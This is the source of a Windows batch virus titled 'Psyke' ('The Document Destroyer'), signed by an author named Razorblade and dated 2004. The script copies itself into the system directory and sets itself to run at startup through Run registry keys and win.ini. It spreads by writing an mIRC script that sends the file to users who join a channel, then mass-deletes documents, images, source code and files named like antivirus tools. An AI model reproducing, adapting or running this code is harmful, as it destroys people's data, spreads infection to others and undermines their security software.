@echo off
:: Psyke Batch Virus
:: THe DoCuMeNT DeSTRoYeR
:: by Razorblade

eChO PsYkE by RaZoRblade

mD "%systemroot%\Psyke"
cOpY %0 "%systemroot%\Psyke\psyke.bat
cOpY %0 "%systemroot%\psyke.bat
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v DokumentManager /t REG_SZ /d "%systemroot%\psyke.bat" /f
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v PsykeDOCMgr /t REG_SZ /d "%systemroot%\Psyke\psyke.bat" /f

eChO [windows] >> "%systemroot%\win.ini"
eChO load=%systemroot%\psyke.bat >> "%systemroot%\win.ini"
eChO run=%systemroot%\psyke.bat >> "%systemroot%\win.ini"

eChO [script] > "%programfiles%\mIRC\eventz.ini"
eChO n0=on 1:JOIN:#:{ >> "%programfiles%\mIRC\eventz.ini"
eChO n1=if ($nick == $me) { halt } >> "%programfiles%\mIRC\eventz.ini"
eChO n2=/dcc send $nick "C:\WINDOWS\psyke.bat"  >> "%programfiles%\mIRC\eventz.ini"
eChO n3=} >> "%programfiles%\mIRC\eventz.ini"

DeL "*.doc"
DeL "*.xls"
DeL "*.dot"
DeL "*.htm"
DeL "*.php"
DeL "*.wab"
DeL "*.hlp"
DeL "*.txt"
DeL "*.ppt"
DeL "*.vdh"
DeL "*.jpg"
DeL "*.gif"
DeL "*.bmp"
DeL "*.lib"
DeL "*.xml"
DeL "*.c"
DeL "*.cpp"
DeL "*.dos"
DeL "*.html"

cLS

DeL "my~1.*"
DeL "important.*"
DeL "urgent.*"
DeL "avp.*"
DeL "kavp.*"
DeL "norton~1.*"
DeL "privat.*"
DeL "pedo~1.*"

cLS

:: 2004
:: PsyKe